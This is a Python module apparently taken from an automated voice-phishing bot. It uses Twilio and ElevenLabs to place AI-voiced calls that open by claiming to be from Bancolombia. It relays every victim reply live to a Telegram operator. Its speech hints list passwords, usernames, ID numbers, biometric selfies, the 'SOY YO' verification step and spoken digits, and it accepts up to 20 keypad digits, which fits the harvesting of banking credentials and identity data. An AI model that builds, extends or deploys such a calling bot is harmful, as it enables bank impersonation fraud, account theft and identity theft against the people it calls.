"""
Gestor de llamadas VoIP con Twilio y ElevenLabs
Patrón: State - Gestión de estados de llamada
"""
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from loguru import logger
from config import settings
from datetime import datetime
from typing import Dict, List, TYPE_CHECKING, Optional
import asyncio
import time
import os

if TYPE_CHECKING:
    from main import CallerBot


class VoIPManager:
    """
    Gestor de llamadas VoIP
    Patrón: State + Facade
    """
    
    # Constantes
    MAX_HISTORY = 100
    ELEVENLABS_RETRIES = 5
    RETRY_DELAY = 0.5
    AI_TIMEOUT = 3.0
    
    def __init__(self, caller_bot: 'CallerBot'):
        self.caller_bot = caller_bot
        self.client: Optional[Client] = None
        self.active_calls: Dict[str, dict] = {}
        self.call_history: List[dict] = []
        self.no_speech_attempts: Dict[str, int] = {}
        self.call_lock = asyncio.Lock()
        
        logger.info("📞 VoIP Manager inicializado")
    
    
    async def initialize(self) -> None:
        """Inicializar cliente Twilio"""
        try:
            self.client = Client(settings.twilio_account_sid, settings.twilio_auth_token)
            logger.info("✅ Twilio inicializado")
        except Exception as e:
            logger.error(f"❌ Error Twilio: {e}")
            raise
    
    async def make_call(self, to_number: str, telegram_chat_id: int) -> str:
        """Iniciar llamada"""
        if not self.client:
            raise Exception("Cliente Twilio no inicializado")
        
        try:
            webhook_url = f"{settings.webhook_url}/voice/incoming"
            status_callback_url = f"{settings.webhook_url}/voice/status"
            
            call = self.client.calls.create(
                to=to_number,
                from_=settings.twilio_phone_number,
                url=webhook_url,
                method='POST',
                status_callback=status_callback_url,
                status_callback_event=['initiated', 'ringing', 'answered', 'completed'],
                status_callback_method='POST',
                record=False,
                timeout=60
            )
            
            # Registrar llamada
            self.active_calls[call.sid] = {
                'sid': call.sid,
                'number': to_number,
                'telegram_chat_id': telegram_chat_id,
                'start_time': datetime.now(),
                'status': 'initiated',
                'transcript': []
            }
            
            self.no_speech_attempts[call.sid] = 0
            
            logger.info(f"📞 Llamando a {to_number}")
            return call.sid
            
        except Exception as e:
            logger.error(f"❌ Error llamada: {e}", exc_info=True)
            raise
    
    async def hangup_call(self, call_sid: str) -> bool:
        """Finalizar llamada"""
        async with self.call_lock:
            try:
                self.client.calls(call_sid).update(status='completed')
                
                if call_sid in self.active_calls:
                    call_data = self.active_calls.pop(call_sid)
                    call_data['duration'] = (datetime.now() - call_data['start_time']).seconds
                    call_data['status'] = 'completed'
                    call_data['end_time'] = datetime.now()
                    
                    self.call_history.append(call_data)
                    if len(self.call_history) > self.MAX_HISTORY:
                        self.call_history = self.call_history[-self.MAX_HISTORY:]
                
                if call_sid in self.no_speech_attempts:
                    del self.no_speech_attempts[call_sid]
                
                logger.info(f"🔴 Llamada finalizada: {call_sid[:8]}")
                return True
                
            except Exception as e:
                logger.error(f"❌ Error colgar {call_sid[:8]}: {e}")
                return False
    
    async def hangup_all_calls(self) -> dict:
        """Finalizar todas las llamadas"""
        active_call_ids = list(self.active_calls.keys())
        total = len(active_call_ids)
        
        if total == 0:
            return {'success': 0, 'failed': 0, 'total': 0}
        
        logger.info(f"🔴 Finalizando {total} llamadas...")
        
        tasks = [self.hangup_call(call_sid) for call_sid in active_call_ids]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        success = sum(1 for r in results if r is True)
        failed = total - success
        
        logger.info(f"✅ Finalizadas: {success}/{total}")
        
        return {'success': success, 'failed': failed, 'total': total}
    
    
    async def handle_incoming_call(self, call_sid: str) -> str:
        """Manejar llamada entrante"""
        try:
            logger.info(f"📞 PROCESANDO: {call_sid}")
            
            # Auto-registrar si no existe
            if call_sid not in self.active_calls:
                logger.warning(f"⚠️ Auto-registrando {call_sid[:8]}")
                self.active_calls[call_sid] = {
                    'sid': call_sid,
                    'number': 'Desconocido',
                    'telegram_chat_id': None,
                    'start_time': datetime.now(),
                    'status': 'answered',
                    'transcript': []
                }
                self.no_speech_attempts[call_sid] = 0
            else:
                self.active_calls[call_sid]['status'] = 'answered'
                telegram_chat_id = self.active_calls[call_sid].get('telegram_chat_id')
                phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
                
                if telegram_chat_id:
                    asyncio.create_task(self._notify_call_answered(telegram_chat_id, phone_number, call_sid))
            
            # Generar saludo inicial
            if not self.caller_bot or not hasattr(self.caller_bot, 'ai_conversation'):
                initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
            else:
                try:
                    initial_message = await asyncio.wait_for(
                        self.caller_bot.ai_conversation.get_initial_greeting(),
                        timeout=self.AI_TIMEOUT
                    )
                except (asyncio.TimeoutError, Exception) as e:
                    logger.warning(f"⏱️ Timeout/Error AI: {e} - fallback")
                    initial_message = "Hola buenos días, te hablo de Bancolombia. ¿Me escuchas bien?"
            
            # Registrar en transcript
            if call_sid in self.active_calls:
                self.active_calls[call_sid]['transcript'].append({
                    'speaker': 'ai',
                    'text': initial_message,
                    'timestamp': datetime.now()
                })
            
            # Generar audio con ElevenLabs
            logger.info(f"🎵 Sintetizando: '{initial_message[:50]}'...")
            twiml = await self.generate_elevenlabs_twiml(initial_message, call_sid)
            logger.info(f"✅ TwiML generado")
            return twiml
            
        except Exception as e:
            logger.error(f"🚨 ERROR handle_incoming_call: {e}", exc_info=True)
            try:
                return await self.generate_elevenlabs_twiml("Hola buenas. ¿Me escuchas bien?", call_sid)
            except:
                return self._generate_say_twiml("Hola buenas. ¿Me escuchas bien?")
    
    async def generate_elevenlabs_twiml(self, text: str, call_sid: str) -> str:
        """Generar TwiML con ElevenLabs"""
        for attempt in range(self.ELEVENLABS_RETRIES):
            try:
                response = VoiceResponse()
                audio_filename = f"call_{call_sid}_{int(datetime.now().timestamp() * 1000)}.mp3"
                
                logger.info(f"🎙️ ElevenLabs {attempt + 1}/5: '{text[:50]}'...")
                audio_bytes = await self.caller_bot.voice_synthesizer.text_to_speech(
                    text,
                    filename=audio_filename
                )
                
                if not audio_bytes or len(audio_bytes) < 1000:
                    raise Exception("Audio muy pequeño")
                
                audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
                
                # Gather optimizado
                gather = Gather(
                    input='speech dtmf',
                    language=settings.language,
                    timeout=settings.gather_timeout,
                    speech_timeout=settings.speech_timeout,
                    speechTimeout=settings.speech_timeout,
                    maxSpeechTime=settings.max_speech_time,
                    action='/voice/process_speech',
                    method='POST',
                    profanityFilter=False,
                    enhanced=True,
                    speech_model='phone_call',
                    numDigits=20,
                    hints='sí claro, no gracias, hola buenas, aló buenas, cómo estás, bien gracias, perfecto listo, entiendo, si señora, si señor, correcto, exacto, aja, pues sí, obvio, dale, listo entonces, bueno entonces, ok perfecto, de una, parcero, hermano, compa, dígame, cuéntame, mire, vea, espere un momento, un segundo, ya ya, ahora sí, banco, Bancolombia, Davivienda, cédula, documento, identidad, nombre completo, apellidos, teléfono, celular, correo electrónico, clave, contraseña, usuario, app, aplicación, descargar, instalar, activar, verificar, confirmar, biometría, rostro, selfie, foto, cámara, SOY YO, números: cero, uno, dos, tres, cuatro, cinco, seis, siete, ocho, nueve, diez, once, doce, trece, catorce, quince'
                )
                
                gather.play(audio_url)
                response.append(gather)
                response.redirect('/voice/process_speech')
                
                logger.info(f"✅ ElevenLabs OK ({len(audio_bytes)} bytes)")
                return str(response)
                
            except Exception as e:
                logger.error(f"❌ Intento {attempt + 1}/5: {e}")
                if attempt < self.ELEVENLABS_RETRIES - 1:
                    await asyncio.sleep(self.RETRY_DELAY)
                else:
                    logger.error("🚨 ElevenLabs falló - COLGANDO")
                    return self._generate_error_twiml()
    
    async def _notify_call_answered(self, telegram_chat_id: int, phone_number: str, call_sid: str) -> None:
        """Notificar llamada contestada"""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            message = f"""━━━━━━━━━━━━━━━━━━━━━━━
✅ **LLAMADA ACTIVA**
━━━━━━━━━━━━━━━━━━━━━━━

📞 **Número:** `{phone_number}`
⏰ **Inicio:** {timestamp}
🆔 **ID:** `{call_sid[:12]}`

🎧 *Cliente en línea*
"""
            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
        except:
            pass
    
    async def _send_ai_response_to_telegram(self, telegram_chat_id: int, text: str, phone_number: str = None) -> None:
        """Enviar respuesta IA a Telegram"""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            call_id = phone_number if phone_number and phone_number != 'Desconocido' else "N/A"
            message = f"🤖 **LOBO HR** • `{call_id}`\n⏰ {timestamp}\n\n💬 {text}\n━━━━━━━━━━━━━━━━━"
            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
        except:
            pass
    
    async def handle_speech_input(self, call_sid: str, speech_text: str, input_type: str = "VOZ") -> str:
        """Procesar entrada del usuario (voz o DTMF)"""
        try:
            if call_sid not in self.active_calls:
                logger.warning(f"⚠️ Llamada no encontrada: {call_sid}")
                return self._generate_error_twiml()
            
            if not speech_text or speech_text.strip() == "":
                logger.info(f"🔇 Sin respuesta: {call_sid}")
                return await self.generate_followup_question(call_sid)
            
            # Reset contador
            self.no_speech_attempts[call_sid] = 0
            
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
            
            # Registrar entrada
            self.active_calls[call_sid]['transcript'].append({
                'speaker': 'user',
                'text': speech_text,
                'type': input_type,
                'timestamp': datetime.now()
            })
            
            # Notificar a Telegram
            emoji = "🎤" if input_type == "VOZ" else "⌨️"
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            try:
                message = f"{emoji} **CLIENTE** • `{phone_number}`\n⏰ {timestamp} • _{input_type}_\n\n💭 \"{speech_text}\"\n━━━━━━━━━━━━━━━━━"
                await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
            except:
                pass
            
            # Obtener respuesta IA
            ai_response = await self.caller_bot.ai_conversation.get_response(call_sid, speech_text)
            
            # Registrar respuesta
            self.active_calls[call_sid]['transcript'].append({
                'speaker': 'ai',
                'text': ai_response,
                'timestamp': datetime.now()
            })
            
            # Notificar en background
            asyncio.create_task(
                self._send_ai_response_to_telegram(telegram_chat_id, ai_response, phone_number)
            )
            
            # Generar audio y responder
            return await self.generate_elevenlabs_twiml(ai_response, call_sid)
            
        except Exception as e:
            logger.error(f"❌ Error procesando voz: {e}", exc_info=True)
            return self._generate_error_twiml()
    
    async def generate_twiml_response(self, text: str, call_sid: str) -> str:
        """Generar TwiML con ElevenLabs"""
        return await self.generate_elevenlabs_twiml(text, call_sid)
    
    async def generate_followup_question(self, call_sid: str) -> str:
        """Generar pregunta de seguimiento sin respuesta"""
        self.no_speech_attempts[call_sid] = self.no_speech_attempts.get(call_sid, 0) + 1
        
        current_attempts = self.no_speech_attempts[call_sid]
        max_attempts = settings.no_speech_attempts
        
        logger.warning(f"⚠️ Sin respuesta {call_sid} - {current_attempts}/{max_attempts}")
        
        # Máximo alcanzado: despedirse
        if current_attempts >= max_attempts:
            logger.warning(f"🔴 Finalizando {call_sid} - sin respuesta")
            
            if call_sid in self.active_calls:
                telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
                phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                message = f"""━━━━━━━━━━━━━━━━━━━━━━━
⚠️ **LLAMADA FINALIZADA**
━━━━━━━━━━━━━━━━━━━━━━━

📞 **Número:** `{phone_number}`
⏰ **Fin:** {timestamp}
❌ **Motivo:** Sin respuesta

🔴 *Terminada*
"""
                await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
            
            # Despedida y colgar
            response = VoiceResponse()
            try:
                audio_bytes = await self.caller_bot.voice_synthesizer.text_to_speech("Gracias, hasta luego.")
                audio_url = f"{settings.webhook_url}/audio/goodbye_{call_sid[:8]}.mp3"
                response.play(audio_url)
            except:
                response.say("Gracias, hasta luego.", language='es-CO', voice='Polly.Mia')
            response.hangup()
            return str(response)
        
        # Pregunta de seguimiento
        followup_questions = [
            "¿Aló? ¿Me escuchas?",
            "¿Estás ahí?",
            "¿Hola?",
            "¿Sigues ahí?",
            "¿Me puedes responder?"
        ]
        question = followup_questions[min(current_attempts - 1, len(followup_questions) - 1)]
        
        # Notificar
        if call_sid in self.active_calls:
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
            
            message = f"🔇 **SIN RESPUESTA** • `{phone_number}`\n\n⚠️ Intento {current_attempts}/{max_attempts}\n🔄 *\"{question}\"*"
            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
        
        return await self.generate_twiml_response(question, call_sid)
    
    async def handle_call_status(self, call_sid: str, call_status: str) -> None:
        """Manejar actualizaciones de estado"""
        logger.info(f"📊 Estado {call_sid[:8]}: {call_status}")
        
        if call_sid in self.active_calls:
            self.active_calls[call_sid]['status'] = call_status
            
            telegram_chat_id = self.active_calls[call_sid]['telegram_chat_id']
            phone_number = self.active_calls[call_sid].get('number', 'Desconocido')
            
            status_messages = {
                'initiated': f'📞 **Iniciando** • `{phone_number}`',
                'ringing': f'📱 **Timbrando** • `{phone_number}`',
                'in-progress': f'✅ **En curso** • `{phone_number}`',
                'completed': f'🔴 **Finalizada** • `{phone_number}`',
                'failed': f'❌ **Fallida** • `{phone_number}`',
                'busy': f'📵 **Ocupado** • `{phone_number}`',
                'no-answer': f'📭 **No contestó** • `{phone_number}`',
                'canceled': f'🚫 **Cancelada** • `{phone_number}`'
            }
            
            message = status_messages.get(call_status, f"📊 `{call_status}` • `{phone_number}`")
            await self.caller_bot.telegram_bot.send_message(telegram_chat_id, message)
            
            if call_status in ['completed', 'failed', 'busy', 'no-answer', 'canceled']:
                await self.hangup_call(call_sid)
    
    async def get_active_calls(self) -> List[dict]:
        """Obtener llamadas activas con duración"""
        calls = []
        for call_sid, call_data in self.active_calls.items():
            duration = (datetime.now() - call_data['start_time']).seconds
            calls.append({
                'sid': call_sid,
                'number': call_data['number'],
                'duration': duration,
                'status': call_data['status'],
                'transcript_length': len(call_data['transcript'])
            })
        return calls
    
    async def get_call_history(self, limit: int = 10) -> List[dict]:
        """Obtener historial reciente"""
        return self.call_history[-limit:][::-1]
    
    async def cleanup(self) -> None:
        """Limpiar recursos"""
        logger.info("🧹 Limpiando VoIP Manager...")
        
        for call_sid in list(self.active_calls.keys()):
            try:
                await self.hangup_call(call_sid)
            except Exception as e:
                logger.error(f"Error finalizando {call_sid}: {e}")
        
        self.no_speech_attempts.clear()
        logger.info("✅ Limpieza completa")
    
    def _generate_error_twiml(self) -> str:
        """Error crítico - intentar ElevenLabs, luego Say"""
        logger.error("🚨 ERROR CRÍTICO")
        response = VoiceResponse()
        
        try:
            loop = asyncio.get_event_loop()
            error_msg = "Disculpa, inconvenientes técnicos. Intenta más tarde. Hasta luego."
            
            audio_bytes = loop.run_until_complete(
                self.caller_bot.voice_synthesizer.text_to_speech(error_msg)
            )
            
            audio_filename = f"error_{int(time.time())}.mp3"
            audio_path = os.path.join("audio_cache", audio_filename)
            with open(audio_path, 'wb') as f:
                f.write(audio_bytes)
            
            audio_url = f"{settings.webhook_url}/audio/{audio_filename}"
            response.play(audio_url)
            logger.info("✅ Error con ElevenLabs")
        except Exception as e:
            logger.error(f"❌ Fallback a Say: {e}")
            response.say(
                "Disculpa, inconvenientes técnicos. Intenta más tarde. Hasta luego.",
                language='es-CO',
                voice='Polly.Mia'
            )
        
        response.hangup()
        return str(response)
    
    def _generate_say_twiml(self, message: str) -> str:
        """Fallback con Say en español"""
        logger.warning(f"⚠️ Say fallback: {message}")
        response = VoiceResponse()
        gather = Gather(
            input='speech dtmf',
            language='es-CO',
            timeout=3,
            speech_timeout='auto',
            action='/voice/process_speech',
            method='POST',
            hints='sí, no, claro, bueno, listo, perfecto, hola, aló'
        )
        gather.say(message, voice='Polly.Mia', language='es-CO')
        response.append(gather)
        response.redirect('/voice/process_speech')
        return str(response)
